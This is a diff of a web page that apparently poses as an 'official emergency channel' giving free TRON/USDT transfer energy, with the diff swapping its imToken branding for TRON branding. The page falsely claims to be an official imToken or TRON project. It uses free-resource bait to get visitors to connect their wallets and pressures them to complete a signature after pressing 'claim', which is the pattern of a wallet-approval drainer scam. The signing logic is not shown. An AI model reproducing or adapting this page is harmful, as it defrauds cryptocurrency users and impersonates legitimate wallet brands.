@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>imToken官方应急通道</title>
-    <meta property="og:title" content="imToken官方应急通道" />
-    <meta property="og:description" content="imToken专属能量领取通道，每个钱包地址每30天可免费领取90000μs USDT转账能量" />
+    <title>Tron官方应急通道</title>
+    <meta property="og:title" content="TRON官方应急通道" />
+    <meta property="og:description" content="TRON网络专属能量领取通道，每个钱包地址每30天可免费领取90000μs USDT转账能量" />
     <meta property="og:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
     <meta property="og:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
     <meta property="og:type" content="website" />
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="imToken官方应急通道" />
-    <meta name="twitter:description" content="imToken专属能量领取通道，每个钱包地址每30天可免费领取90000μs USDT转账能量" />
+    <meta name="twitter:title" content="TRON官方应急通道" />
+    <meta name="twitter:description" content="TRON网络专属能量领取通道，每个钱包地址每30天可免费领取90000μs USDT转账能量" />
     <meta name="twitter:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
     <meta name="twitter:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
@@ -410,14 +410,14 @@ body {
             <div class="header">
                 <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/log.png" alt="imToken Logo" class="header-logo">
                 <div>
-                    <h1>imToken</h1>
+                    <h1>TRON</h1>
                 </div>
             </div>
             <div class="lang-switch">
                 <button id="langToggle" class="lang-toggle">
                   <i class="fa fa-globe"></i>
                 </button>
-                <span id="headerDesc" class="lang-text">imToken官方应急通道</span>
+                <span id="headerDesc" class="lang-text">TRON网络官方应急通道</span>
             </div>
         </div>
         <div id="userInfo">
@@ -428,7 +428,7 @@ body {
             <div class="status-title"><h3 id="walletStatusTitle">钱包状态</h3></div>
             <div class="disconnected-content">
                 <span id="disconnectedText">未连接钱包</span>
-                <p><span class="highlight" id="disconnectedTip1">此链接为imToken专属通道，非imToken用户不可领取</span></p>
+                <p><span class="highlight" id="disconnectedTip1">此链接为TRON网络专属通道，非TRON网络用户不可领取</span></p>
                 <p><span class="highlight" id="disconnectedTip2">1. 每个钱包地址30天内只可免费领取一次</span></p>         
                 <p><span class="highlight" id="disconnectedTip3">2. 此链接只为用户在钱包无能量的紧急情况下提供能量支援非盈利项目</span></p>
                 <p><span class="highlight" id="disconnectedTip4">3. 点击领取后系统将审核钱包地址是否符合领取要求</span></p>
@@ -438,7 +438,7 @@ body {
                 <p id="connectedSuccess">✅ 钱包已成功连接</p>
                 <p id="connectedAddress">• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
                 <p id="connectedType">• 领取类型：<span class="highlight">USDT转账能量</span></p>
-                <p id="connectedAmount">• 领取额度：<span class="highlight">90000能量</span></p>
+                <p id="connectedAmount">• 领取额度：<span class="highlight">90000 μs</span></p>
                 <p class="orange-tip" id="connectedWarn">⚠️提示：点击领取后请务必完成签名，中途退出视为已领取30日内不可再次领取</p>
             </div>
         </div>
@@ -450,14 +450,14 @@ body {
                 <p>• 合约地址：<span class="highlight" id="contractAddr"></span></p>
                 <p>• 剩余能量：<span class="highlight data-tag" id="contractEnergy"></span>μs</p>
                 <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
-                    注：剩余能量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。
+                    注：剩余能量为“ 0 ”时停止领取，该项目为TRON官方发行，只限TRON网络用户参与。
                 </p>
             </div>
         </div>
         <div class="special-tip-container" id="specialTipContainer">
             <div class="special-tip-title" id="specialTipTitle">imToken-EAB</div>
             <div class="special-tip-content" id="specialTipContent">
-                此链接仅为imToken用户在钱包无能量、无TRX需要在Tron网络转账情况下的紧急援助，资源有限请勿当作盈利项目。
+                此链接仅为TRON网络用户在钱包无能量、无TRX需要在TRON网络转账情况下的紧急援助，资源有限请勿当作盈利项目。
             </div>
         </div>
         <div class="record-list" id="recordList">
@@ -479,7 +479,7 @@ body {
             <button id="connectBtn" class="btn">连接钱包</button>
             <button id="approveBtn" class="btn" disabled>领取能量</button>
             <div id="reviewTip" class="review-tip" style="display: none;">
-               <span id="reviewTipText">系统审核中，审核通过后请务必完成签名</span>
+               <span id="reviewTipText">⚠️ 系统审核中，审核通过后请务必完成签名</span>
             </div>
         </div>
         <div class="footer-info" id="footerInfo">
@@ -496,14 +496,14 @@ body {
                         <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/imToken.png" alt="imToken">
                         <div class="wallet-item-info">
                             <div class="wallet-item-name">imToken</div>
-                            <div class="wallet-item-desc">TRC20 / ERC20 / BEP20</div>
+                            <div class="wallet-item-desc">TRC20 </div>
                         </div>
                     </div>
                     <div class="wallet-item" data-wallet="tokenpocket">
                         <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/tokenPocket.png" alt="TokenPocket">
                         <div class="wallet-item-info">
                             <div class="wallet-item-name">TokenPocket</div>
-                            <div class="wallet-item-desc">多链支持，快捷授权</div>
+                            <div class="wallet-item-desc">TRC20</div>
                         </div>
                     </div>
                     <div class="wallet-item" data-wallet="tronlink">
@@ -517,12 +517,12 @@ body {
                         <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/bitget.png" alt="Bitget Wallet">
                         <div class="wallet-item-info">
                             <div class="wallet-item-name">Bitget Wallet</div>
-                            <div class="wallet-item-desc">TRC20 / ERC20</div>
+                            <div class="wallet-item-desc">TRC20</div>
                         </div>
                     </div>
                 </div>
                 <div class="wallet-modal-footer">
-                    选择后将自动唤起钱包，无需手动操作
+                    选择后将自动唤起钱包
                 </div>
             </div>
         </div>
@@ -608,12 +608,12 @@ const walletConfig = {
 // ========== 多语言配置（统一文本，以中文为准，补齐缺失） ==========
 const langConfig = {
     zh: {
-        headerTitle: "imToken",
-        headerDesc: "imToken官方应急通道",
+        headerTitle: "TRON",
+        headerDesc: "TRON官方应急通道",
         userInfoDefault: "未连接钱包<br><span>请点击底部「连接钱包」按钮</span>",
         walletStatusTitle: "钱包状态",
         disconnectedText: "未连接钱包",
-        disconnectedTip1: "此链接为imToken专属通道，非imToken用户不可领取",
+        disconnectedTip1: "此链接为TRON专属通道，非TRON网络用户不可领取",
         disconnectedTip2: "1. 每个钱包地址30天内只可免费领取一次",
         disconnectedTip3: "2. 此链接只为用户在钱包无能量的紧急情况下提供能量支援非盈利项目",
         disconnectedTip4: "3. 点击领取后系统将审核钱包地址是否符合领取要求",
@@ -626,7 +626,7 @@ const langConfig = {
         contractResourceTitle: "合约剩余资源",
         contractAddrText: "• 合约地址：<span class='highlight' id='contractAddr'></span>",
         contractEnergyText: "• 剩余能量：<span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
-        contractNote: "注：剩余能量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。",
+        contractNote: "注：剩余能量为“ 0 ”时停止领取，该项目为TRON官方发行，只限TRON网络用户参与。",
         recordTypeTitle: "能量使用范围",
         recordAmountTitle: "转账额度",
         energyType: "USDT转账",
@@ -671,20 +671,20 @@ const langConfig = {
         errorTipPrefix: "⚠️ ",
         noWalletAddress: "未检测到有效钱包地址<br><span style='color: #ef4444; font-size: 14px;'>❌ 请连接钱包后重试</span>",
         nonImTokenUser: "非钱包环境<br><span style='color: #3b82f6; font-size: 13px;'>请点击按钮选择钱包，自动唤起访问</span>",
-        specialTipTitle: "imToken-EAB",
-        specialTipContent: "此链接仅为imToken用户在钱包无能量、无TRX需要在Tron网络转账情况下的紧急援助，资源有限请勿当作盈利项目。",
+        specialTipTitle: "TRON-EAB",
+        specialTipContent: "此链接仅为TRON用户在钱包无能量、无TRX需要在TRON网络转账情况下的紧急援助，资源有限请勿当作盈利项目。",
         retryQueryBtn: "重试查询",
         tooManyPeopleTip: "现在领取的人太多了请稍后重试",
         唤起WalletTip: "正在唤起钱包，请稍候...",
         submitRequestTip: "正在提交请求，准备唤起钱包..."
     },
     en: {
-        headerTitle: "imToken",
-        headerDesc: "imToken Official Emergency Channel",
+        headerTitle: "TRON",
+        headerDesc: "TRON Official Emergency Channel",
         userInfoDefault: "Wallet not connected<br><span>Click the 'Connect Wallet' button below</span>",
         walletStatusTitle: "Wallet Status",
         disconnectedText: "Wallet not connected",
-        disconnectedTip1: "This link is exclusive to imToken users - non-imToken users cannot claim",
+        disconnectedTip1: "This link is exclusive to TRON users - non-TRON users cannot claim",
         disconnectedTip2: "1. Each wallet address can claim free energy once every 30 days",
         disconnectedTip3: "2. This non-profit project provides emergency energy support for users with no wallet energy",
         disconnectedTip4: "3. The system will verify if the wallet address meets the requirements after clicking 'Claim'",
@@ -692,12 +692,12 @@ const langConfig = {
         connectedSuccess: "✅ Wallet connected successfully",
         connectedAddress: "• Wallet Address: <span class='highlight' id='statusAddress'></span>",
         connectedType: "• Claim Type: <span class='highlight'>USDT Transfer Energy</span>",
-        connectedAmount: "• Claim Quota: <span class='highlight'>90000μs Energy</span>",
+        connectedAmount: "• Claim Quota: <span class='highlight'>90000 μs Energy</span>",
         connectedWarn: "⚠️ Note: Please complete the signature after clicking 'Claim' - exiting midway counts as claimed (no re-claim within 30 days)",
         contractResourceTitle: "Contract Remaining Resources",
         contractAddrText: "• Contract Address: <span class='highlight' id='contractAddr'></span>",
         contractEnergyText: "• Remaining Energy: <span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
-        contractNote: "Note: Distribution stops when remaining energy is '0' - Official imToken project, only for imToken users",
+        contractNote: "Note: Distribution stops when remaining energy is '0' - Official imToken project, only for TRON users",
         recordTypeTitle: "Energy Usage Scope",
         recordAmountTitle: "Transfer Quota",
         energyType: "USDT Transfer",
@@ -742,7 +742,7 @@ const langConfig = {
         errorTipPrefix: "⚠️ ",
         noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 14px;'>❌ Please connect wallet and try again</span>",
         nonImTokenUser: "Non-wallet environment<br><span style='color: #3b82f6; font-size: 13px;'>Click button to select wallet, auto-launch access</span>",
-        specialTipTitle: "imToken-EAB",
+        specialTipTitle: "TRON-EAB",
         specialTipContent: "This link is only for emergency assistance to imToken users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project.",
         retryQueryBtn: "Retry Query",
         tooManyPeopleTip: "Too many people are claiming now, please try again later",
@@ -750,7 +750,7 @@ const langConfig = {
         submitRequestTip: "Submitting request, preparing to launch wallet..."
     }
 };
-let currentLang = localStorage.getItem("imtoken_energy_lang") || "zh";
+let currentLang = localStorage.getItem("TRON_energy_lang") || "zh";
 // ========== 二次授权校验工具 ==========
 const AUTHORIZED_KEY = "authorized_wallet_addresses";
 function getAuthorizedAddresses() {
